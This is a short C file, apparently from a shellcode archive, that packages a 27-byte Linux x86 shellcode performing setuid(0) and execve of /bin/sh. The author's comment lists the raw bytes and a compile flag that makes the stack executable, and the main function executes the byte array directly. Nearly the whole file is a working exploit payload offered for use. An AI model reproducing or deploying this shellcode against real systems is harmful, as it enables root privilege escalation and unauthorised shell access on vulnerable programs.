#include <stdio.h>
#include <string.h>

/*
	by Magnefikko
	24.04.2010
	magnefikko@gmail.com
	Promhyl Studies :: http://promhyl.oz.pl
	Subgroup: #PRekambr
	Name: 27 bytes setuid(0) ^ execve("/bin/sh", 0, 0) shellcode
	Platform: Linux x86

	setuid(0);
	execve("/bin/sh", 0, 0);

	gcc -Wl,-z,execstack filename.c

	shellcode:

\x6a\x17\x58\x31\xdb\xcd\x80\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x31\xc9\xb0\x0b\xcd\x80

*/


int main(){
	char shell[] ="\x6a\x17\x58\x31\xdb\xcd\x80\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x31\xc9\xb0\x0b\xcd\x80";
	printf("by Magnefikko\nmagnefikko@gmail.com\npromhyl.oz.pl\n\nstrlen(shell)= %d\n", strlen(shell));
	(*(void (*)()) shell)();
}